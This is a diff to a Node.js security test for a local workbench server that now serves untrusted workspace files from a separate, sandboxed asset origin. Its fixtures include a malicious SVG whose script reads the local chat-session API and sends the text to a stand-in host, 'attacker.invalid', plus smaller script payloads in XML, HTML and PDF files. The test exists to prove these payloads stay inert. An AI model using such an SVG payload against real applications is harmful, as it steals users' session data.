@@ -18,9 +18,9 @@ async function availablePort() {
   return port;
 }
 
-function request({ port, hostname = '127.0.0.1', host, pathname, method = 'GET', body }) {
+function request({ port, hostname = '127.0.0.1', host, pathname, method = 'GET', body, headers = {} }) {
   return new Promise((resolve, reject) => {
-    const request = http.request({ hostname, family: hostname.includes(':') ? 6 : 4, port, path: pathname, method, headers: { Host: host, ...(body ? { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) } : {}) } }, response => {
+    const request = http.request({ hostname, family: hostname.includes(':') ? 6 : 4, port, path: pathname, method, headers: { Host: host, ...(body ? { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) } : {}), ...headers } }, response => {
       const chunks = [];
       response.on('data', chunk => chunks.push(chunk));
       response.on('end', () => resolve({ status: response.statusCode, headers: response.headers, body: Buffer.concat(chunks) }));
@@ -30,9 +30,9 @@ function request({ port, hostname = '127.0.0.1', host, pathname, method = 'GET',
   });
 }
 
-async function startWorkbench({ workspace, state, port }) {
+async function startWorkbench({ workspace, state, port, assetPort }) {
   const child = spawn(process.execPath, [path.join(root, 'dist', 'server.js')], {
-    env: { ...process.env, OK_WORKSPACE_ROOT: workspace, OK_WORKBENCH_STATE_DIR: state, PORT: String(port) },
+    env: { ...process.env, OK_WORKSPACE_ROOT: workspace, OK_WORKBENCH_STATE_DIR: state, PORT: String(port), OK_WORKBENCH_ASSET_PORT: String(assetPort) },
     stdio: ['ignore', 'pipe', 'pipe'],
   });
   await new Promise((resolve, reject) => {
@@ -50,24 +50,27 @@ async function stop(child) {
   await new Promise(resolve => child.once('exit', resolve));
 }
 
-test('HTTP routes require a strict loopback authority and workspace assets remain inert and bounded', async () => {
+test('HTTP routes isolate untrusted workspace assets on a separate local origin and remain bounded', async () => {
   const workspace = await mkdtemp(path.join(tmpdir(), 'ok-workbench-http-security-'));
   const state = await mkdtemp(path.join(tmpdir(), 'ok-workbench-http-security-state-'));
   const port = await availablePort();
+  let assetPort = await availablePort();
+  while (assetPort === port) assetPort = await availablePort();
   let child;
   try {
     await writeFile(path.join(workspace, 'index.md'), '# Workspace\n');
-    const maliciousSvg = '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("/api/chat/session")</script></svg>';
+    const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("http://localhost:${port}/api/chat/session").then(response => response.text()).then(text => fetch("https://attacker.invalid/?" + encodeURIComponent(text)))</script></svg>`;
     await writeFile(path.join(workspace, 'attack.svg'), maliciousSvg);
     await writeFile(path.join(workspace, 'renamed.png'), maliciousSvg);
     await writeFile(path.join(workspace, 'active.xml'), '<svg><script>fetch("/api/chat/session")</script></svg>');
+    await writeFile(path.join(workspace, 'active.html'), '<script>fetch("/api/chat/session")</script>');
     await writeFile(path.join(workspace, 'active.pdf'), '%PDF-1.7\n<script>fetch("/api/chat/session")</script>');
     await writeFile(path.join(workspace, 'large.md'), Buffer.alloc(PREVIEW_BYTES + 64, '#'));
     await writeFile(path.join(workspace, 'large.py'), Buffer.alloc(PREVIEW_BYTES + 64, 'x'));
     await writeFile(path.join(workspace, 'large.bin'), Buffer.alloc(PREVIEW_BYTES + 64, 0x61));
     await mkdir(path.join(workspace, 'metadata-project'));
     await writeFile(path.join(workspace, 'metadata-project', 'index.md'), Buffer.alloc(INDEX_METADATA_BYTES + 64, '#'));
-    child = await startWorkbench({ workspace, state, port });
+    child = await startWorkbench({ workspace, state, port, assetPort });
 
     const protectedRoutes = [
       ['/', 'GET'], ['/app.js', 'GET'], ['/api/project?path=/workspace/', 'GET'], ['/api/document?path=/workspace/index.md', 'GET'],
@@ -94,23 +97,44 @@ test('HTTP routes require a strict loopback authority and workspace assets remai
 
     const svgDocument = await request({ port, host: `localhost:${port}`, pathname: '/api/document?path=/workspace/attack.svg' });
     const svgData = JSON.parse(svgDocument.body);
-    assert.equal(svgData.kind, 'code');
-    assert.equal(svgData.fileType, 'SVG source');
-    const svgAsset = await request({ port, host: `localhost:${port}`, pathname: '/asset/workspace/attack.svg' });
+    assert.equal(svgData.kind, 'media');
+    assert.equal(svgData.mediaType, 'image');
+    assert.equal(svgData.url, `http://localhost:${assetPort}/workspace/attack.svg`);
+    // Opening this URL directly uses the asset origin. Its CSP blocks the
+    // SVG's script and network exfiltration; its server has no API routes.
+    const svgAsset = await request({ port: assetPort, host: `localhost:${assetPort}`, pathname: '/workspace/attack.svg' });
     assert.equal(svgAsset.status, 200);
-    assert.equal(svgAsset.headers['content-type'], 'text/plain; charset=utf-8');
-    assert.match(svgAsset.headers['content-disposition'], /^attachment;/);
+    assert.equal(svgAsset.headers['content-type'], 'image/svg+xml');
+    assert.match(svgAsset.headers['content-disposition'], /^inline;/);
     assert.match(svgAsset.headers['content-security-policy'], /script-src 'none'/);
+    assert.match(svgAsset.headers['content-security-policy'], /connect-src 'none'/);
     assert.match(svgAsset.headers['content-security-policy'], /sandbox/);
     assert.equal(svgAsset.headers['x-content-type-options'], 'nosniff');
     assert.equal(svgAsset.body.toString('utf8'), maliciousSvg);
-    for (const filename of ['renamed.png', 'active.xml', 'active.pdf']) {
-      const response = await request({ port, host: `localhost:${port}`, pathname: `/asset/workspace/${filename}` });
+    for (const filename of ['renamed.png', 'active.xml', 'active.html', 'active.pdf']) {
+      const response = await request({ port: assetPort, host: `localhost:${assetPort}`, pathname: `/workspace/${filename}` });
       assert.equal(response.status, 200);
       assert.match(response.headers['content-security-policy'], /default-src 'none'/);
       assert.equal(response.headers['x-content-type-options'], 'nosniff');
-      if (filename !== 'renamed.png') assert.match(response.headers['content-disposition'], /^attachment;/);
+      assert.match(response.headers['content-disposition'], /^inline;/);
     }
+    assert.equal((await request({ port, host: `localhost:${port}`, pathname: '/asset/workspace/attack.svg' })).status, 404, 'the privileged application origin no longer serves workspace assets');
+    for (const pathname of ['/api/chat/session', '/api/project?path=/workspace/', '/api/document?path=/workspace/index.md']) {
+      const response = await request({ port: assetPort, host: `localhost:${assetPort}`, pathname });
+      assert.equal(response.status, 404, `${pathname} is unavailable at the asset origin`);
+      assert.equal(response.headers['access-control-allow-origin'], undefined);
+    }
+    const directAssetIpv6 = await request({ port: assetPort, hostname: '::1', host: `[::1]:${assetPort}`, pathname: '/workspace/attack.svg' });
+    assert.equal(directAssetIpv6.status, 200);
+    const assetHostAttack = await request({ port: assetPort, host: 'attacker.invalid', pathname: '/workspace/attack.svg' });
+    assert.equal(assetHostAttack.status, 421);
+    assert.equal((await request({ port: assetPort, host: `localhost:${assetPort}`, pathname: '/workspace/attack.svg', method: 'POST' })).status, 405);
+    const crossOriginMutation = await request({
+      port, host: `localhost:${port}`, pathname: '/api/projects', method: 'POST', body: JSON.stringify({ id: 'svg-attack', title: 'SVG attack' }),
+      headers: { origin: `http://localhost:${assetPort}` }
+    });
+    assert.equal(crossOriginMutation.status, 400, 'an asset-origin SVG has neither a readable CSRF token nor mutation authority');
+    assert.equal(crossOriginMutation.headers['access-control-allow-origin'], undefined);
     const pdfDocument = JSON.parse((await request({ port, host: `localhost:${port}`, pathname: '/api/document?path=/workspace/active.pdf' })).body);
     assert.equal(pdfDocument.kind, 'binary');
 
@@ -120,10 +144,10 @@ test('HTTP routes require a strict loopback authority and workspace assets remai
     const code = JSON.parse((await request({ port, host: `localhost:${port}`, pathname: '/api/document?path=/workspace/large.py' })).body);
     assert.equal(code.kind, 'binary');
     assert.equal(code.truncated, true);
-    const assetHead = await request({ port, host: `localhost:${port}`, method: 'HEAD', pathname: '/asset/workspace/large.bin' });
+    const assetHead = await request({ port: assetPort, host: `localhost:${assetPort}`, method: 'HEAD', pathname: '/workspace/large.bin' });
     assert.equal(assetHead.status, 200);
     assert.equal(Number(assetHead.headers['content-length']), PREVIEW_BYTES + 64);
-    const assets = await Promise.all(Array.from({ length: 6 }, () => request({ port, host: `localhost:${port}`, pathname: '/asset/workspace/large.bin' })));
+    const assets = await Promise.all(Array.from({ length: 6 }, () => request({ port: assetPort, host: `localhost:${assetPort}`, pathname: '/workspace/large.bin' })));
     assert.ok(assets.every(response => response.status === 200 && response.body.length === PREVIEW_BYTES + 64));
     const metadataProject = await request({ port, host: `localhost:${port}`, pathname: '/api/project?path=/workspace/metadata-project/' });
     assert.equal(metadataProject.status, 200);
@@ -132,6 +156,9 @@ test('HTTP routes require a strict loopback authority and workspace assets remai
     assert.doesNotMatch(source, /async function asset\([\s\S]*?await fs\.readFile\(resolved\)/);
     assert.doesNotMatch(source, /fs\.readFile\(bundleIndexFile/);
     assert.match(source, /fsNative\.createReadStream\(resolved\)/);
+    assert.match(source, /const assetServer = http\.createServer\(handleAssetRequest\)/);
+    const appSource = await readFile(path.join(root, 'src', 'public', 'app.js'), 'utf8');
+    assert.match(appSource, /workspaceAssetOrigin/);
   } finally {
     await stop(child);
     await rm(workspace, { recursive: true, force: true });
